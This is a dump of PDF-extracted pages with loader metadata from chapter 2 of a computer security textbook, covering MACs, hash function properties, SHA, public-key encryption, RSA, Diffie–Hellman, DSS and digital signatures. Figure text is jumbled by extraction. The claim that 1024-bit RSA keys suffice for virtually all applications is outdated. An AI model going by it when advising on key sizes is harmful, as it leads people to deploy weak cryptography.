generate a small block of data, known as a message authentication \\ncode, that is appended to the message. This technique assumes that two communicat-\\ning parties, say A and B, share a common secret key KAB. When A has a message to \\nsend to B, it calculates the message authentication code as a complex function of the \\nmessage and the key: MACM = F(KAB, M).3 The message plus code are transmitted \\n3Because messages may be any size and the message authentication code is a small fixed size, there must \\ntheoretically be many messages that result in the same MAC. However, it should be infeasible in practice \\nto find pairs of such messages with the same MAC. This is known as collision resistance.\\nM02_STAL0611_04_GE_C02.indd   60 10/11/17   2:42 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 62, 'page_label': '61'}, page_content='2.2 / meSSage auThenTiCaTion and haSh funCTionS  61\\nto the intended recipient. The recipient performs the same calculation on the received \\nmessage, using the same secret key, to generate a new message authentication code. \\nThe received code is compared to the calculated code (see Figure 2.3). If we assume \\nthat only the receiver and the sender know the identity of the secret key, and if the \\nreceived code matches the calculated code, then:\\n1. The receiver is assured that the message has not been altered. If an attacker \\nalters the message but does not alter the code, then the receiver’s calculation \\nof the code will differ from the received code. Because the attacker is assumed \\nnot to know the secret key, the attacker cannot alter the code to correspond to \\nthe alterations in the message.\\n2. The receiver is assured that the message is from the alleged sender. Because no \\none else knows the secret key, no one else could prepare a message with a proper \\ncode.\\n3. If the message includes a sequence number (such as is used with X.25, HDLC, \\nand TCP), then the receiver can be assured of the proper sequence, because an \\nattacker cannot successfully alter the sequence number.\\nA number of algorithms could be used to generate the code. The now with -\\ndrawn NIST publication FIPS PUB 113 (Computer Data Authentication, May 1985), \\nrecommended the use of DES. However AES would now be a more suitable choice. \\nDES or AES is used to generate an encrypted version of the message, and some of \\nFigure 2.3 Message Authentication Using a Message Authentication Code (MAC)\\nMAC\\nalgorithm\\nMAC\\nalgorithm\\nMAC\\nK\\nK\\nCompare\\nMessage\\nTransmit\\nM02_STAL0611_04_GE_C02.indd   61 10/11/17   2:42 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 63, 'page_label': '62'}, page_content='62  ChaPTer 2 / CryPTograPhiC ToolS\\nthe bits of ciphertext are used as the code. A 16- or 32-bit code used to be typical, but \\nwould now be much too small to provide sufficient collision resistance, as we will \\ndiscuss shortly.4\\nThe process just described is similar to encryption. One difference is that the \\nauthentication algorithm need not be reversible, as it must for decryption. It turns \\nout that because of the mathematical properties of the authentication function, it is \\nless vulnerable to being broken than encryption.\\nonE-Way haSh Function An alternative to the message authentication code is \\nthe one-way hash function. As with the message authentication code, a hash function \\naccepts a variable-size message M as input and produces a fixed-size message digest \\nH(M) as output (see Figure 2.4). Typically, the message is padded out to an integer \\nmultiple of some fixed length (e.g., 1024 bits) and the padding includes the value of \\nthe length of the original message in bits. The length field is a security measure to \\nincrease the difficulty for an attacker to produce an alternative message with the \\nsame hash value.\\nUnlike the MAC, a hash function does not take a secret key as input.\\xa0 Figure\\xa02.5 \\nillustrates three ways in which the message can be authenticated using a hash \\n function. The message digest can be encrypted using symmetric encryption \\n4Recall from our discussion of practical security issues in Section 2.1 that for large amounts of data, some \\nmode of operation is needed to apply a block cipher such as DES to amounts of data larger than a single \\nblock. For the MAC application mentioned here, DES is applied in what is known as cipher block chaining \\nmode (CBC). In essence, DES is applied to each 64-bit block of the message in sequence, with the input to \\nthe encryption algorithm being the XOR of the current plaintext block and the preceding ciphertext block. \\nThe MAC is derived from the final block encryption. See Chapter 20 for a discussion of CBC.\\nFigure 2.4 Cryptographic Hash Function; h /uni003D.boldH(M)\\nMessage or data block M (variable length) P, L\\nH\\nP, L = padding plus length ﬁeld\\nL bits\\nHash value h\\n(ﬁxed length)\\nM02_STAL0611_04_GE_C02.indd   62 10/11/17   2:42 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 64, 'page_label': '63'}, page_content='2.2 / meSSage auThenTiCaTion and haSh funCTionS  63\\n(see\\xa0Figure\\xa02.5a); if it is assumed that only the sender and receiver share the encryp-\\ntion key, then authenticity is assured. The message digest can also be encrypted using \\npublic-key encryption (see Figure 2.5b); this is explained in Section 2.3. The public-\\nkey approach has two advantages: It provides a digital signature as well as message \\nauthentication, and it does not require the distribution of keys to communicating \\nparties.\\nFigure 2.5 Message Authentication Using a One-Way Hash Function\\nSource e DA stination B\\nMessage\\nMessage\\nCompar e\\nMessageMessage\\nH\\nH\\nH\\nE\\n(a) Using symmetric encryption\\nK\\nD\\nK\\nMessage\\nMessage\\nMessage\\nCompar e\\nMessage\\nH\\nH\\nH\\nE\\nK\\nKK\\nK\\n(b) Using public-key encryption\\n(c) Using secret value\\nPRa PUa\\nCompar e\\nD\\nMessage\\nM02_STAL0611_04_GE_C02.indd   63 10/11/17   2:42 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 65, 'page_label': '64'}, page_content='64  ChaPTer 2 / CryPTograPhiC ToolS\\nThese two approaches have an advantage over approaches that encrypt the \\nentire message, in that less computation is required. But an even more common \\napproach is the use of a technique that avoids encryption altogether. Several reasons \\nfor this interest are pointed out in [TSUD92]:\\n• Encryption software is quite slow . Even though the amount of data to be \\nencrypted per message is small, there may be a steady stream of messages into \\nand out of a system.\\n• Encryption hardware costs are nonnegligible. Low-cost chip implementations \\nof DES and AES are available, but the cost adds up if all nodes in a network \\nmust have this capability.\\n• Encryption hardware is optimized toward large data sizes. For small blocks of \\ndata, a high proportion of the time is spent in initialization/invocation overhead.\\n• An encryption algorithm may be protected by a patent.\\nFigure 2.5c shows a technique that uses a hash function but no encryption for \\nmessage authentication. This technique, known as a keyed hash MAC, assumes that \\ntwo communicating parties, say A and B, share a common secret key K. This secret \\nkey is incorporated into the process of generating a hash code. In the approach illus-\\ntrated in Figure 2.5c, when A has a message to send to B, it calculates the hash function \\nover the concatenation of the secret key and the message: MDM = H(K }M }K).5  \\nIt then sends [M }MDM] to B. Because B possesses K, it can recompute H(K }M }K) \\nand verify MDM. Because the secret key itself is not sent, it should not be possible \\nfor an attacker to modify an intercepted message. As long as the secret key remains \\nsecret, it should not be possible for an attacker to generate a false message.\\nNote the secret key is used as both a prefix and a suffix to the message. If\\xa0the \\nsecret key is used as either only a prefix or only a suffix, the scheme is less secure. \\nThis topic will be discussed in Chapter 21. Chapter 21 also describes a scheme known \\nas HMAC, which is somewhat more complex than the approach of Figure 2.5c and \\nwhich has become the standard approach for a keyed hash MAC.\\nSecure Hash Functions\\nThe one-way hash function, or secure hash function, is important not only in message \\nauthentication but also in digital signatures. In this section, we begin with a discus -\\nsion of requirements for a secure hash function. Then we discuss specific algorithms.\\nhaSh Function rEquirEMEntS The purpose of a hash function is to produce a \\n“fingerprint” of a file, message, or other block of data. To be useful for message \\nauthentication, a hash function H must have the following properties:\\n1. H can be applied to a block of data of any size.\\n2. H produces a fixed-length output.\\n3. H(x) is relatively easy to compute for any given x, making both hardware and \\nsoftware implementations practical.\\n5|| denotes concatenation.\\nM02_STAL0611_04_GE_C02.indd   64 10/11/17   2:42 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 66, 'page_label': '65'}, page_content='2.2 / meSSage auThenTiCaTion and haSh funCTionS  65\\n4. For any given code h, it is computationally infeasible to find x such that H(x) = h. \\nA hash function with this property is referred to as one-way  or preimage \\nresistant.6\\n5. For any given block x, it is computationally infeasible to find y /uni2260.alt1x with \\nH(y) = H(x). A hash function with this property is referred to as second preim-\\nage resistant. This is sometimes referred to as weak collision resistant.\\n6. It is computationally infeasible to find any pair ( x, y) such that H(x) = H(y). \\nA hash function with this property is referred to as collision resistant. This is \\nsometimes referred to as strong collision resistant.\\nThe first three properties are requirements for the practical application of a hash \\nfunction to message authentication.\\nThe fourth property is the one-way property: It is easy to generate a code given \\na message, but virtually impossible to generate a message given a code. This prop -\\nerty is important if the authentication technique involves the use of a secret value \\n(see Figure 2.5c). The secret value itself is not sent; however, if the hash function \\nis not one-way, an attacker can easily discover the secret value: If the attacker can \\nobserve or intercept a transmission, the attacker obtains the message M and the hash \\ncode MDM = H(K }M }K). The attacker then inverts the hash function to obtain \\nK }M }K = H- 1(MDM). Because the attacker now has both M and (K }M }K) it is \\na trivial matter to recover K\\nThe fifth property guarantees that it is impossible to find an alternative mes -\\nsage with the same hash value as a given message. This prevents forgery when an \\nencrypted hash code is used (see Figure 2.5a and b). If this property were not true, \\nan attacker would be capable of the following sequence: First, observe or intercept \\na message plus its encrypted hash code; second, generate an unencrypted hash code \\nfrom the message; and third, generate an alternate message with the same hash code.\\nA hash function that satisfies the first five properties in the preceding list is \\nreferred to as a weak hash function. If the sixth property is also satisfied, then it \\nis referred to as a strong hash function. A strong hash function protects against an \\nattack in which one party generates a message for another party to sign. For example, \\nsuppose Alice agrees to sign an IOU for a small amount that is sent to her by Bob. \\nSuppose also that Bob can find two messages with the same hash value, one of which \\nrequires Alice to pay the small amount, and one that requires a large payment. Alice \\nsigns the first message, and Bob is then able to claim that the second message is \\nauthentic.\\nIn addition to providing authentication, a message digest also provides data \\nintegrity. It performs the same function as a frame check sequence: If any bits in the \\nmessage are accidentally altered in transit, the message digest will be in error.\\nSEcurity  oF haSh F unction S As with symmetric encryption, ther e are two \\napproaches to attacking a secure hash function: cryptanalysis and brute-force attack. \\nAs with symmetric encryption algorithms, cryptanalysis of a hash function involves \\nexploiting logical weaknesses in the algorithm.\\n6For f(x) = y, x is said to be a preimage of y. Unless f is one-to-one, there may be multiple preimage \\nvalues for a given y.\\nM02_STAL0611_04_GE_C02.indd   65 10/11/17   2:42 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 67, 'page_label': '66'}, page_content='66  ChaPTer 2 / CryPTograPhiC ToolS\\nThe strength of a hash function against brute-force attacks depends solely on \\nthe length of the hash code produced by the algorithm. For a hash code of length n, \\nthe level of effort required is proportional to the following:\\nPreimage resistant 2n\\nSecond preimage resistant 2n\\nCollision resistant 2n/2\\nIf collision resistance is required (and this is desirable for a general-purpose \\nsecure hash code), then the value 2n/2 determines the strength of the hash code against \\nbrute-force attacks. Van Oorschot and Wiener [VANO94] presented a design for a \\n$10 million collision search machine for MD5, which has a 128-bit hash length, that \\ncould find a collision in 24 days. Thus, a 128-bit code may be viewed as inadequate. \\nThe next step up, if a hash code is treated as a sequence of 32 bits, is a 160-bit hash \\nlength. With a hash length of 160 bits, the same search machine would require over \\nfour thousand years to find a collision. With today’s technology, the time would be \\nmuch shorter, so 160 bits now appears suspect.\\nSEcurE haSh Function algorithMS In recent years, the most widely used hash \\nfunction has been the Secur e Hash Algorithm (SHA). SHA was developed by the \\nNational Institute of Standards and Technology (NIST) and published as a fed -\\neral information processing standard (FIPS 180) in 1993. When weaknesses were \\n discovered in SHA, a revised version was issued as FIPS 180-1 in 1995 and is gener-\\nally referred to as SHA-1. SHA-1 produces a hash value of 160 bits. In 2002, NIST \\nproduced a revised version of the standard, FIPS 180-2, that defined three new ver-\\nsions of SHA, with hash value lengths of 256, 384, and 512 bits, known as SHA-256, \\nSHA-384, and SHA-512. These new versions, collectively known as SHA-2, have the \\nsame underlying structure and use the same types of modular arithmetic and logical \\nbinary operations as SHA-1. SHA-2, particularly the 512-bit version, would appear to \\nprovide unassailable security. However, because of the structural similarity of SHA-2 \\nto SHA-1, NIST decided to standardize a new hash function that is very different \\nfrom SHA-2 and SHA-1. This new hash function, known as SHA-3, was published in \\n2015 and is now available as an alternative to SHA-2.\\nOther Applications of Hash Functions\\nWe have discussed the use of hash functions for message authentication and for the \\ncreation of digital signatures (the latter will be discussed in more detail later in this \\n chapter). Here are two other examples of secure hash function applications:\\n• Passwords: Chapter 3 will explain a scheme in which a hash of a password is \\nstored by an operating system rather than the password itself. Thus, the actual \\npassword is not retrievable by a hacker who gains access to the password file. \\nIn\\xa0simple terms, when a user enters a password, the hash of that password is \\ncompared to the stored hash value for verification. This application requires \\npreimage resistance and perhaps second preimage resistance.\\nM02_STAL0611_04_GE_C02.indd   66 10/11/17   2:42 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 68, 'page_label': '67'}, page_content='2.3 / PubliC-Key enCryPTion  67\\n• Intrusion detection:  Store the hash value for a file, H(F), for each file on a \\n system and secure the hash values (e.g., on a write-locked drive or write-once \\noptical disk that is kept secure). One can later determine if a file has been \\nmodified by recomputing H(F). An intruder would need to change F without \\nchanging H(F). This application requires weak second preimage resistance.\\n 2.3 PUBLIC-KEY ENCRYPTION\\nOf equal importance to symmetric encryption is public-key encryption, which finds \\nuse in message authentication and key distribution.\\nPublic-Key Encryption Structure\\nPublic-key encryption, first publicly proposed by Diffie and Hellman in 1976 \\n[DIFF76], is the first truly revolutionary advance in encryption in literally thousands \\nof years. Public-key algorithms are based on mathematical functions rather than on \\nsimple operations on bit patterns, such as are used in symmetric encryption algo -\\nrithms. More important, public-key cryptography is asymmetric, involving the use \\nof two separate keys, in contrast to symmetric encryption, which uses only one key. \\nThe use of two keys has profound consequences in the areas of confidentiality, key \\ndistribution, and authentication.\\nBefore proceeding, we should first mention several common misconceptions \\nconcerning public-key encryption. One is that public-key encryption is more secure \\nfrom cryptanalysis than symmetric encryption. In fact, the security of any encryp -\\ntion scheme depends on (1) the length of the key and (2) the computational work \\ninvolved in breaking a cipher. There is nothing in principle about either symmetric \\nor public-key encryption that makes one superior to another from the point of view \\nof resisting cryptanalysis. A second misconception is that public-key encryption is \\na general-purpose technique that has made symmetric encryption obsolete. On the \\ncontrary, because of the computational overhead of current public-key encryption \\nschemes, there seems no foreseeable likelihood that symmetric encryption will be \\nabandoned. Finally, there is a feeling that key distribution is trivial when using pub-\\nlic-key encryption, compared to the rather cumbersome handshaking involved with \\nkey distribution centers for symmetric encryption. For public-key key distribution, \\nsome form of protocol is needed, often involving a central agent, and the procedures \\ninvolved are no simpler or any more efficient than those required for symmetric \\nencryption.\\nA public-key encryption scheme has six ingredients (see Figure 2.6a):\\n• Plaintext: This is the readable message or data that is fed into the algorithm \\nas input.\\n• Encryption algorithm: The encryption algorithm performs various transforma-\\ntions on the plaintext.\\n• Public and private key: This is a pair of keys that have been selected so if one is \\nused for encryption, the other is used for decryption. The exact transformations \\nM02_STAL0611_04_GE_C02.indd   67 10/11/17   2:42 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 69, 'page_label': '68'}, page_content='68  ChaPTer 2 / CryPTograPhiC ToolS\\nperformed by the encryption algorithm depend on the public or private key that \\nis provided as input.7\\n• Ciphertext: This is the scrambled message produced as output. It depends on \\nthe plaintext and the key. For a given message, two different keys will produce \\ntwo different ciphertexts.\\n• Decryption algorithm: This algorithm accepts the ciphertext and the matching \\nkey and produces the original plaintext.\\nAs the names suggest, the public key of the pair is made public for others to \\nuse, while the private key is known only to its owner. A general-purpose public-key \\ncryptographic algorithm relies on one key for encryption and a different but related \\nkey for decryption.\\nThe essential steps are the following:\\n1. Each user generates a pair of keys to be used for the encryption and decryption \\nof messages.\\n2. Each user places one of the two keys in a public register or other accessible file. \\nThis is the public key. The companion key is kept private. As Figure 2.6a suggests, \\neach user maintains a collection of public keys obtained from others.\\n3. If Bob wishes to send a private message to Alice, Bob encrypts the message using \\nAlice’s public key.\\n4. When Alice receives the message, she decrypts it using her private key. No \\nother recipient can decrypt the message because only Alice knows Alice’s pri-\\nvate key.\\nWith this approach, all participants have access to public keys, and private keys \\nare generated locally by each participant and therefore need never be distributed. As \\nlong as a user protects his or her private key, incoming communication is secure. At \\nany time, a user can change the private key and publish the companion public key to \\nreplace the old public key.\\nFigure 2.6b illustrates another mode of operation of public-key cryptography. \\nIn this scheme, a user encrypts data using his or her own private key. Anyone who \\nknows the corresponding public key will then be able to decrypt the message.\\nNote the scheme of Figure 2.6a is directed toward providing confidentiality. \\nOnly the intended recipient should be able to decrypt the ciphertext because only \\nthe intended recipient is in possession of the required private key. Whether in fact \\nconfidentiality is provided depends on a number of factors, including the security of \\nthe algorithm, whether the private key is kept secure, and the security of any protocol \\nof which the encryption function is a part.\\nThe scheme of Figure 2.6b is directed toward providing authentication and/\\nor data integrity. If a user is able to successfully recover the plaintext from Bob’s \\nciphertext using Bob’s public key, this indicates only Bob could have encrypted the \\n7The key used in symmetric encryption is typically referred to as a secret key . The two keys used for \\npublic-key encryption are referred to as the public key and the private key. Invariably, the private key is \\nkept secret, but it is referred to as a private key rather than a secret key to avoid confusion with symmetric \\nencryption.\\nM02_STAL0611_04_GE_C02.indd   68 10/11/17   2:42 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 70, 'page_label': '69'}, page_content='2.3 / PubliC-Key enCryPTion  69\\nFigure 2.6 Public-Key Cryptography\\nPlaintext\\ninput\\nBobs’s\\npublic key\\nring\\nTransmitted\\nciphertext\\nPlaintext\\noutputEncryption algorithm\\n(e.g., RSA)\\nDecryption algorithm\\nJoy\\nMike\\nMike Bob\\nTed\\nAlice\\nAlice’s public\\nkey\\nAlice’s private\\nkey\\n(a) Encryption with public key\\nPlaintext\\ninput\\nTransmitted\\nciphertext\\nPlaintext\\noutputEncryption algorithm\\n(e.g., RSA)\\nDecryption algorithm\\nBob’s private\\nkey\\nBob\\nBob’s public\\nkey\\nAlice’s\\npublic key\\nring\\nJoy Ted\\n(b) Encryption with private key\\nX\\nX\\nPU a\\nPU b\\nPRa\\nPRb\\nY = E[ PU a, X]\\nY = E[ PRb, X]\\nX =\\nD[ PRa, Y]\\nX =\\nD[ PU b, Y]\\nAlice\\nBob Alice\\nplaintext, thus providing authentication. Further, no one but Bob would be able to \\nmodify the plaintext because only Bob could encrypt the plaintext with Bob’s private \\nkey. Once again, the actual provision of authentication or data integrity depends on \\na variety of factors. This issue will be addressed primarily in Chapter 21, but other \\nreferences are made to it where appropriate in this text.\\nM02_STAL0611_04_GE_C02.indd   69 10/11/17   2:42 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 71, 'page_label': '70'}, page_content='70  ChaPTer 2 / CryPTograPhiC ToolS\\nApplications for Public-Key Cryptosystems\\nPublic-key systems are characterized by the use of a cryptographic type of algorithm \\nwith two keys, one held private and one available publicly. Depending on the appli-\\ncation, the sender uses either the sender’s private key or the receiver’s public key, or \\nboth, to perform some type of cryptographic function. In broad terms, we can classify \\nthe use of public-key cryptosystems into three categories: digital signature, symmetric \\nkey distribution, and encryption of secret keys.\\nThese applications will be discussed in Section 2.4. Some algorithms are suit -\\nable for all three applications, whereas others can be used only for one or two of \\nthese applications. Table 2.3 indicates the applications supported by the algorithms \\ndiscussed in this section.\\nRequirements for Public-Key Cryptography\\nThe cryptosystem illustrated in Figure 2.6 depends on a cryptographic algorithm \\nbased on two related keys. Diffie and Hellman postulated this system without dem-\\nonstrating that such algorithms exist. However, they did lay out the conditions that \\nsuch algorithms must fulfill [DIFF76]:\\n1. It is computationally easy for a party B to generate a pair (public key PUb, \\nprivate key PRb).\\n2. It is computationally easy for a sender A, knowing the public key and the message \\nto be encrypted, M, to generate the corresponding ciphertext:\\nC = E(PUb, M)\\n3. It is computationally easy for the receiver B to decrypt the resulting ciphertext \\nusing the private key to recover the original message:\\nM = D(PRb, C) = D[PRb, E(PUb, M)]\\n4. It is computationally infeasible for an opponent, knowing the public key, PUb, to \\ndetermine the private key, PRb.\\n5. It is computationally infeasible for an opponent, knowing the public key, PUb, \\nand a ciphertext, C, to recover the original message, M.\\nAlgorithm Digital Signature\\nSymmetric Key \\nDistribution\\nEncryption of \\nSecret Keys\\nRSA Yes Yes Yes\\nDiffie–Hellman No Yes No\\nDSS Yes No No\\nElliptic Curve Yes Yes Yes\\nTable 2.3 Applications for Public-Key Cryptosystems\\nM02_STAL0611_04_GE_C02.indd   70 10/11/17   2:42 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 72, 'page_label': '71'}, page_content='2.3 / PubliC-Key enCryPTion  71\\nWe can add a sixth requirement that, although useful, is not necessary for all \\npublic-key applications:\\n6. Either of the two related keys can be used for encryption, with the other used \\nfor decryption.\\nM = D[PUb, E(PRb, M)] = D[PRb, E(PUb, M)]\\nAsymmetric Encryption Algorithms\\nIn this subsection, we briefly mention the most widely used asymmetric encryption \\nalgorithms. Chapter 21 will provide technical details.\\nrSa One of the first public-key schemes was developed in 1977 by Ron Rivest, Adi \\nShamir, and Len Adleman at MIT and first published in 1978 [RIVE78]. The RSA \\nscheme has since reigned supreme as the most widely accepted and implemented \\napproach to public-key encryption. RSA is a block cipher in which the plaintext and \\nciphertext are integers between 0 and n - 1 for some n.\\nIn 1977 , the three inventors of RSA dared Scientific American readers to decode \\na cipher they printed in Martin Gardner’s “Mathematical Games” column. They \\noffered a $100 reward for the return of a plaintext sentence, an event they predicted \\nmight not occur for some 40 quadrillion years. In April of 1994, a group working over \\nthe Internet and using over 1600 computers claimed the prize after only eight months \\nof work [LEUT94]. This challenge used a public-key size (length of n) of 129 decimal \\ndigits, or around 428 bits. This result does not invalidate the use of RSA; it simply \\nmeans that larger key sizes must be used. Currently, a 1024-bit key size (about 300 \\ndecimal digits) is considered strong enough for virtually all applications.\\nDiFFiE–hEllMan K Ey agrEEMEnt The first published public-key algorithm \\nappeared in the seminal paper by Diffie and Hellman that defined public-key cryptog-\\nraphy [DIFF76] and is generally referred to as Diffie–Hellman key exchange, or key \\nagreement. A number of commercial products employ this key exchange technique.\\nThe purpose of the algorithm is to enable two users to securely reach agree -\\nment about a shared secret that can be used as a secret key for subsequent symmetric \\nencryption of messages. The algorithm itself is limited to the exchange of the keys.\\nDigital SignaturE StanDarD The National Institute of Standards and Technology \\n(NIST) published this originally as FIPS PUB 186 (Digital Signature Standard (DSS), \\nMay 1994). The DSS makes use of SHA-1 and presents a new digital signature tech-\\nnique, the Digital Signature Algorithm (DSA). The DSS was originally proposed in \\n1991 and revised in 1993 in response to public feedback concerning the security of the \\nscheme. There were further revisions in 1998, 2000, 2009, and most recently in 2013 as \\nFIPS PUB 186–4. The DSS uses an algorithm that is designed to provide only the  digital \\nsignature function. Unlike RSA, it cannot be used for encryption or key exchange.\\nElliptic curvE cryptography The vast majority of the products and standards \\nthat use public-k ey cryptography for encryption and digital signatures use RSA. \\nThe bit length for secure RSA use has increased over recent years, and this has \\nput a heavier processing load on applications using RSA. This burden has ramifica-\\ntions, especially for electronic commerce sites that conduct large numbers of secure \\nM02_STAL0611_04_GE_C02.indd   71 10/11/17   2:42 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 73, 'page_label': '72'}, page_content='72  ChaPTer 2 / CryPTograPhiC ToolS\\ntransactions. Recently, a competing system has begun to challenge RSA: elliptic curve \\ncryptography (ECC). Already, ECC is showing up in standardization efforts, includ-\\ning the IEEE (Institute of Electrical and Electronics Engineers) P1363 Standard for \\nPublic-Key Cryptography.\\nThe principal attraction of ECC compared to RSA is that it appears to offer \\nequal security for a far smaller bit size, thereby reducing processing overhead. On \\nthe other hand, although the theory of ECC has been around for some time, it is \\nonly recently that products have begun to appear and that there has been sustained \\ncryptanalytic interest in probing for weaknesses. Thus, the confidence level in ECC \\nis not yet as high as that in RSA.\\n 2.4 DIGITAL SIGNATURES AND KEY MANAGEMENT\\nAs mentioned in Section 2.3, public-key algorithms are used in a variety of applica-\\ntions. In broad terms, these applications fall into two categories: digital signatures, \\nand various techniques to do with key management and distribution.\\nWith respect to key management and distribution, there are at least three \\n distinct aspects to the use of public-key encryption in this regard:\\n• The secure distribution of public keys\\n• The use of public-key encryption to distribute secret keys\\n• The use of public-key encryption to create temporary keys for message encryption\\nThis section provides a brief overview of digital signatures and the various types of \\nkey management and distribution.\\nDigital Signature\\nPublic-key encryption can be used for authentication with a technique known as the \\ndigital signature. NIST FIPS PUB 186-4 [Digital Signature Standard (DSS), July 2013] \\ndefines a digital signature as follows: The result of a cryptographic transformation \\nof data that, when properly implemented, provides a mechanism for verifying origin \\nauthentication, data integrity and signatory non-repudiation.\\nThus, a digital signature is a data-dependent bit pattern, generated by an agent \\nas a function of a file, message, or other form of data block. Another agent can access \\nthe data block and its associated signature and verify (1) the data block has been \\nsigned by the alleged signer, and (2) the data block has not been altered since the \\nsigning. Further, the signer cannot repudiate the signature.\\nFIPS 186-4 specifies the use of one of three digital signature algorithms:\\n• Digital Signature Algorithm (DSA):  The original NIST-approved algorithm, \\nwhich is based on the difficulty of computing discrete logarithms.\\n• RSA Digital Signature Algorithm: Based on the RSA public-key algorithm.\\n• Elliptic Curve Digital Signature Algorithm (ECDSA): Based on elliptic-curve \\ncryptography.\\nFigure 2.7 is a generic model of the process of making and using digital signa -\\ntures. All of the digital signature schemes in FIPS 186-4 have this structure. Suppose \\nM02_STAL0611_04_GE_C02.indd   72 10/11/17   2:42 PM'),\n",
